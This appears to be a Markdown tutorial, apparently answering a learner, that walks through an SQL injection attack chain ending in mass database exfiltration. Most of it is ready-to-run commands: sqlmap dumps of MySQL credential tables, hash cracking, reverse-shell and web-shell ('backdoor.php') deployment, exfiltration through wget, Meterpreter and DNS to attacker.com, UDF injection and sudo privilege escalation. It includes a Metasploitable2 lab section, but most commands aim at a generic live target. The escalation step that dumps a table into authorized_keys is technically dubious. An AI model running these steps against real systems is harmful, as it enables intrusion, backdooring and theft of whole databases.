# SQL Injection to Mass Database Exfiltration: The Real Attack Chain

## The Core Confusion: Two Different Types of Credentials

| Application Credentials | Database Credentials |
|------------------------|---------------------|
| Found in: `users` table | Found in: `mysql.user` table |
| Used for: Website admin login | Used for: Direct MySQL connection |
| Example: `admin:admin123` | Example: `dbuser:dbpassword123` |
| ❌ Wrong target for dumping | ✅ Correct target for dumping |

---

## Step-by-Step Attack Chain

### Phase 1: Extract Database Credentials via SQLi

```bash
# Dump the MySQL user table, NOT the app's users table
sqlmap -u "http://target.com/index.php?id=1" -D mysql -T user --dump
```

**Output you'll get:**

```sql
+--------+-----------+-------------------------------------------+
| user   | host      | password                                  |
+--------+-----------+-------------------------------------------+
| root   | localhost | *81F5E21E35407D884A6CD4A731A872FB8AF3E... |
| dbuser | %         | *2470C0C06DEE42FD1618BB99005ADCA2EC9D...  |
+--------+-----------+-------------------------------------------+
```

---

### Phase 2: Crack the Database User's Hash

```bash
# Crack the DB user hash (not the website admin hash)
hashcat -m 300 hash.txt rockyou.txt

# Result: dbuser:dbpassword123
```

⚠️ **This password connects to MySQL, not the website.**

---

### Phase 3: Get Shell Access on the Server

#### Method A: Direct OS Shell (Fastest)

```bash
sqlmap -u "http://target.com/index.php?id=1" --os-pwn
# This gives you a Meterpreter/reverse shell on the server
```

#### Method B: Web Shell (If FILE Privilege Exists)

```bash
sqlmap -u "http://target.com/index.php?id=1" \
  --file-write=shell.php \
  --file-dest=/var/www/html/backdoor.php

# Access: http://target.com/backdoor.php?cmd=id
```

#### Method C: Credential Reuse

```bash
# Try the DB password on SSH/FTP
ssh dbuser@target.com  # Password: dbpassword123
```

---

### Phase 4: Dump Database at Native Speed

Now that you're **ON the server**, run:

```bash
# From your shell prompt on the target server:
mysqldump -h 127.0.0.1 -u dbuser -p'dbpassword123' --all-databases > /tmp/full_dump.sql
```

**Why 127.0.0.1 works:** You're executing this ON the server itself  
**Speed:** 500MB/s (disk I/O), not 1KB/s (SQLi inference)

---

### Phase 5: Exfiltrate the Dump

```bash
# Download via web shell
wget http://target.com/backdoor.php?cmd=cat%20/tmp/full_dump.sql

# Or via Meterpreter session
download /tmp/full_dump.sql /home/attacker/data/
```

---

## Visual Comparison: Your Confusion vs. Reality

| What You Think Happens | What Actually Happens |
|------------------------|----------------------|
| Crack website hash `admin:admin123` | Crack DB user hash `dbuser:dbpassword123` |
| Log into website admin panel | Connect to MySQL service directly |
| Use SQLMap to slowly dump data | Use DB credentials + shell to dump locally |
| `mysqldump -h target.com ...` (from attacker PC) | `mysqldump -h 127.0.0.1 ...` (from inside server) |
| `--file-write` is the main method | `--os-pwn` or credential reuse is faster |

---

## Metasploitable2 Lab Example

```bash
# 1. Extract DB credentials
sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1" \
  --cookie="security=low; PHPSESSID=your_session_here" \
  --batch -D mysql -T user --dump
# Result: root : password (default creds)

# 2. Get OS shell
sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1" \
  --cookie="security=low; PHPSESSID=your_session_here" \
  --os-shell

# 3. Inside the shell (you're now www-data@metasploitable2)
os-shell> mysqldump -h 127.0.0.1 -u root -ppassword dvwa > /tmp/dvwa.sql
# Dump completes in ~3 seconds

# 4. Download the file
os-shell> exit
sqlmap -u "http://192.168.56.101/dvwa/..." --file-read=/tmp/dvwa.sql
```

---

## Speed Comparison: SQLi vs. Native Dump

| Method | Speed | Time for 1GB |
|--------|-------|--------------|
| Blind SQLi inference | ~1 KB/s | ~12 days |
| UNION-based SQLi | ~100 KB/s | ~3 hours |
| Native `mysqldump` (post-exploit) | 500 MB/s | ~2 seconds |

---

## Advanced Techniques When Basic Methods Fail

### When FILE Privilege is Disabled

#### A) DNS Exfiltration
```bash
sqlmap -u "http://target.com/index.php?id=1" --dns-domain=attacker.com
# Uses DNS queries to bypass HTTP firewalls
```

#### B) User-Defined Functions (UDF) Injection
```bash
sqlmap -u "http://target.com/index.php?id=1" --udf-inject
# Compiles malicious library into MySQL
# Gives code execution inside MySQL process
```

### Credential Reuse Escalation Chain

```bash
# 1. Got DB password: dbpassword123
# 2. Try SSH
ssh dbuser@target.com  # SUCCESS! ✅

# 3. Check sudo privileges
sudo -l
# Output: (root) NOPASSWD: /usr/bin/mysqldump

# 4. Privilege escalation
sudo mysqldump mysql user -r /root/.ssh/authorized_keys
# Now you have root SSH access
```

---

## Common Dead Ends (Why Attacks Fail)

| Scenario | Why It Fails |
|----------|-------------|
| `mysql -h target.com -u dbuser -p` | Port 3306 firewalled (99% of servers) |
| `--file-write` shell upload | FILE privilege revoked (modern hardening) |
| Password reuse on SSH | Strong SSH key-only auth |
| PHPMyAdmin access | IP whitelisted or hidden endpoint |

**Result:** Attacker stuck with slow SQLi dump only (still gets data, but takes days)

---

## The Golden Rule

> **Hackers don't dump massive databases through SQLi. They dump credentials via SQLi, escalate to shell access, then use native tools.**

### The Correct Flow:
```
SQLi → mysql.user creds → Shell access → mysqldump (2 seconds)
```

### The Wrong Flow:
```
SQLi → Dump entire database row-by-row (48 hours) ❌
```

---

## Real-World Pentest Checklist

After getting DB credentials:

- [ ] Try direct MySQL connection (port 3306)
- [ ] Test credential reuse on SSH/FTP
- [ ] Search for PHPMyAdmin/Adminer panels
- [ ] Use `--os-pwn` for reverse shell
- [ ] Check for `FILE` privilege (`SHOW GRANTS`)
- [ ] Look for UDF injection opportunities
- [ ] Extract config files via `LOAD_FILE()`
- [ ] Search for AWS keys in environment variables

**Stop using SQLMap after Step 3. Switch to native tools from inside the server.**

---

## Practice Progression

### Level 1: Basic (Metasploitable2)
```bash
sqlmap --os-shell → mysqldump locally
```

### Level 2: Realistic Constraints
```bash
# Simulate FILE privilege disabled
mysql> REVOKE FILE ON *.* FROM 'root'@'localhost';

# Practice alternatives
sqlmap --udf-inject
sqlmap --dns-domain=attacker.com
```

### Level 3: Advanced Lateral Movement
```bash
# 1. Get webapp user creds
# 2. Password reuse on SSH/FTP
# 3. Pivot to internal databases
# 4. Exploit trust relationships
```

---

## Key Takeaways

1. **Target `mysql.user` table, not application users**
2. **DB credentials ≠ Website login credentials**
3. **127.0.0.1 only works when running commands ON the server**
4. **SQLi is for reconnaissance; native tools are for exfiltration**
5. **Credential reuse is the #1 escalation vector**

---

**Remember:** The "slow SQLMap" problem you experienced is exactly why professionals escalate to shell access. The tool is for discovery, not mass data theft.
